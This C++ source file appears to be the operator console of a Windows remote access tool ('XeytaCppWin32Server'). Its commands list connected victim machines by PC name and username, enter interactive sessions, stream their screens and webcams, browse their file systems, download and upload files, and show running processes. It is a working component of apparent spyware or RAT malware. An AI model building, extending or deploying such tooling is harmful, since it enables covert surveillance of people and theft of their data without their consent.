#include "AppConsole.h"
#include "../../models/Client.h"
#include "../../../shared/IOLib/services/StringService.h"
#include <iostream>
#include <cstdarg>
#include "../../../shared/IOLib/services/FileSystemService.h"

AppConsole::AppConsole(): client(nullptr), currentView(View::Main)
{
	Console();
}

AppConsole::~AppConsole()
{
}

void AppConsole::showMainUi()
{
	currentView = View::Main;
	println("XeytaCppWin32Server");
}

bool AppConsole::handleInstruction(char* instruction)
{
	if (StringService::equalInsensitive("help", instruction))
	{
		printHelp();
		return true;
	}
	else if (StringService::equalInsensitive("list commands", instruction))
	{
		printCommands();
		return true;
	}
	else if (StringService::equalInsensitive(instruction, "desktop"))
	{
		if (isInteracting())
		{
			currentView = View::RemoteDesktop;
			printPrompt();
			return true;
		}
		else
		{
			println("You have to interact with a client before issuing this command");
		}
	}
	else if (StringService::equalInsensitive(instruction, "camera"))
	{
		if (isInteracting())
		{
			currentView = View::Camera;
			printPrompt();
			return true;
		}
		else
		{
			println("You have to interact with a client before issuing this command");
		}
	}
	else if (StringService::equalInsensitive(instruction, "filesystem"))
	{
		if (isInteracting())
		{
			currentView = View::Filesystem;
			printPrompt();
			return true;
		}

		println("You have to interact with a client before issuing this command");
	}
	else if (StringService::startsWith(instruction, "cd"))
	{
		if (isInteracting())
		{
			currentView = View::Filesystem;
			if (strlen(instruction) > 2)
			{
				if (StringService::endsWith(instruction, ".."))
				{
					if (!fsHistory.empty())
						fsHistory.pop_back();
				}
				else
				{
					std::wstring instructionStr = StringService::chartoWString(instruction);
					const size_t pos = instructionStr.find(L" ");
					std::wstring token = instructionStr.substr(0, pos);
					instructionStr.erase(0, pos + 1);
					fsHistory.push_back(instructionStr);
				}
			}
			printPrompt();
		}
		return true;
	}

	return false;
}

void AppConsole::getLine(char* buffer, unsigned int bufferLen)
{
	std::cin.getline(buffer, bufferLen);
	if (handleInstruction(buffer))
		getLine(buffer, bufferLen);
}

View AppConsole::getCurrentView()
{
	return currentView;
}

void AppConsole::printErrorLine(const std::string& errorMessage) const
{
	printErrorLine(errorMessage.c_str());
}

void AppConsole::printErrorLine(const char* errorMessage) const
{
	std::cerr << errorMessage << std::endl;
}

void AppConsole::printFsPrompt()
{
	if (currentView != View::Filesystem)
	{
		std::cout << "You are not in Fs view" << std::endl;
		return;
	}

	std::wcout << "XeytaCppWin32/" << client->getId() << L"/filesystem|> " << getCurrentPath() << "/>$ ";
}

void AppConsole::printPrompt()
{
	if (currentView == View::Filesystem)
		printFsPrompt();
	else
		print(getPromptMessage());
}

void AppConsole::printHelp()
{
	std::cout << "In interaction mode you have different commands" << std::endl;
	std::cout << "Available commands" << std::endl;
	std::cout << "list sessions" << std::endl;
	std::cout << "interact [session_id]" << std::endl;
	printPrompt();
}

void AppConsole::printCommands()
{
	if (currentView >= View::MinInteraction && currentView <= View::MaxInteraction)
	{
		if (currentView == View::Filesystem)
		{
			std::cout << "download [file]\t\t\tDownloads file into current directory" << std::endl;
			std::cout << "upload [file]\t\t\tUploads a file to your current session directory" << std::endl;
		}
		else if (currentView == View::RemoteDesktop)
		{
			std::cout << "config\t\t\tGet monitors information" << std::endl;
			std::cout << "play [monitor]\t\t\tBegins streaming monitor screenshots" << std::endl;
			std::cout << "pause\t\t\tPauses streaming monitor screenshots" << std::endl;
			std::cout << "stop [monitor]\t\t\tStops streaming monitor screenshots" << std::endl;
		}
		else if (currentView == View::Camera)
		{
			std::cout << "config\t\t\tGet cameras information" << std::endl;
			std::cout << "play [camera]\t\t\tBegins streaming monitor screenshots" << std::endl;
			std::cout << "pause\t\t\tPauses streaming monitor screenshots" << std::endl;
			std::cout << "stop [camera]\t\t\tStops streaming monitor screenshots" << std::endl;
		}
	}
	else
	{
		std::cout << "list sessions" << std::endl;
		std::cout << "interact [session_id]" << std::endl;
		std::cout << "help" << std::endl;
	}
}

void AppConsole::println(const std::string& message, bool showPrompt)
{
	Console::println(message);
	if (showPrompt)
		printPrompt();
}

void AppConsole::printf(const char* strFormat, int count, ...)
{
	va_list args;
	int i;
	int sum = 0;

	va_start(args, count);
	for (i = 0; i < count; i++)
		sum += va_arg(args, int);
	va_end(args);

	::printf("%d\n", sum);
}

std::string AppConsole::getPromptMessage(bool withSuffix)
{
	std::string outString;
	if (currentView == View::Main)
		outString.append("XeytaCppWin32");
	else if (currentView >= View::MinInteraction && currentView <= View::MaxInteraction)
	{
		if (client != nullptr)
		{
			outString.append("XeytaCppWin32/")
			         .append(std::to_string(client->getId()));
		}
		else
		{
			printErrorLine(
				"Invalid execution on AppConsole::getPromptMessage, client is nullptr but currentView is interaction");
		}

		if (currentView == View::Filesystem)
		{
			outString.append("filesystem");
		}
		else if (currentView == View::RemoteDesktop)
			outString.append("rdp");
		else if (currentView == View::Camera)
			outString.append("camera");
	}
	else
	{
		outString.append("XeytaCppWin32");
	}

	if (withSuffix)
		outString.append("/>");
	return outString;
}

void AppConsole::printf(bool showPrompt, const char* format, ...)
{
	va_list argptr;
	va_start(argptr, format);
	vfprintf(stderr, format, argptr);
	va_end(argptr);

	if (showPrompt)
	{
		std::string prompt = getPromptMessage();
		print(prompt);
	}
}

void AppConsole::setInteractionView(Client* client)
{
	this->client = client;
	currentView = View::ClientInteraction;

	const std::string prompt = getPromptMessage();
	std::cout << prompt;
}


void AppConsole::showProcesses(Client* client, std::vector<Process>* processes)
{
	if (this->client != client)
	{
	}

	std::cout << "Process list form User (" << client->getId() << ") " << client->getPcName() << std::endl;
	for (unsigned i = 0; i < processes->size(); i++)
	{
		Process process = processes->at(i);
		const size_t index = process.path.find_last_of('\\');

		// TODO: length check
		std::string executable = process.path.substr(index + 1);

		std::cout << "Process(" << process.pid << ") " << executable << std::endl
			<< process.path << std::endl;
	}
}

void AppConsole::showFsRoots(Client* client, const std::vector<FileInfo>& files)
{
	std::cout << "[+] File system operation on client " << client->getId()
		<< " (" << client->getPcName() << ")" << std::endl;
	std::cout << "Listing roots" << std::endl;
	for (const FileInfo& file : files)
	{
		std::wcout << "\t\t" << file.path << "\t";
		if ((UINT)file.dwFileAttributes == DRIVE_UNKNOWN)
			std::cout << "Unknown";
		else if ((UINT)file.dwFileAttributes == DRIVE_NO_ROOT_DIR)
			std::cout << "Invalid, is there a volume mounted?";
		else if ((UINT)file.dwFileAttributes == DRIVE_REMOVABLE)
			std::cout << "Removable Drive";
		else if ((UINT)file.dwFileAttributes == DRIVE_FIXED)
			std::cout << "Fixed Drive";
		else if ((UINT)file.dwFileAttributes == DRIVE_REMOTE)
			std::cout << "Remote Drive";
		else if ((UINT)file.dwFileAttributes == DRIVE_CDROM)
			std::cout << "CD-ROM";
		else if ((UINT)file.dwFileAttributes == DRIVE_RAMDISK)
			std::cout << "RAM disk";

		std::cout << std::endl;
	}
}

void AppConsole::showFsFiles(Client* client, const std::wstring& path, const std::vector<FileInfo>& files)
{
	std::cout << "[+] File system operation on client " << client->getId()
		<< " (" << client->getPcName() << ")" << std::endl;
	std::wcout << "\t" << path << std::endl;
	for (const FileInfo& file : files)
	{
		std::wcout << "\t\t" << file.path << "\t";
		if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			std::wcout << "<DIR>";
		else
			std::wcout << file.fileSize << " bytes";

		std::cout << std::endl;
	}
}

bool AppConsole::isInteracting()
{
	return currentView >= View::MinInteraction && currentView <= View::MaxInteraction;
}

std::wstring AppConsole::getCurrentPath()
{
	std::wstring result;
	if (fsHistory.empty())
	{
		return L"";
	}

	for (const auto& pathStr : fsHistory)
		result.append(pathStr + L"\\");

	return result;
}

void AppConsole::removeClient(Client* client)
{
	// TODO: protect this->currentView with mutex
	if (client == nullptr)
		return;

	const unsigned long long id = client->getId();
	const std::string message = std::string(client->getPcName()).append(" has just disconnected");
	println(message);

	if (isInteracting())
	{
		if (this->client->getId() == id)
		{
			currentView = View::Main;
			this->client = nullptr;
		}
	}
}

void AppConsole::printBanner()
{
	const std::string prompt = getPromptMessage(true);
	std::cout << prompt;
}

void AppConsole::updateListSessions(void* get_data)
{
}

void AppConsole::trace(const char* str)
{
	println(str);
}

void AppConsole::printClients(std::vector<Client*> clients)
{
	std::cout << std::endl;
	std::cout << "========================================" << std::endl;
	std::cout << "			Available Clients			  " << std::endl;
	std::cout << "========================================" << std::endl;

	for (unsigned int i = 0; i < clients.size(); i++)
	{
		Client* c = clients.at(i);
		std::cout
			<< "\t* Client[" << i + 1 << "]\n"
			<< "\t\tId: " << c->getSocketDescriptor() << std::endl
			<< "\t\tPc name: " << c->getPcName() << std::endl
			<< "\t\tOS: " << c->getUsername() << std::endl;
	}
}

Client* AppConsole::getClient()
{
	return client;
}
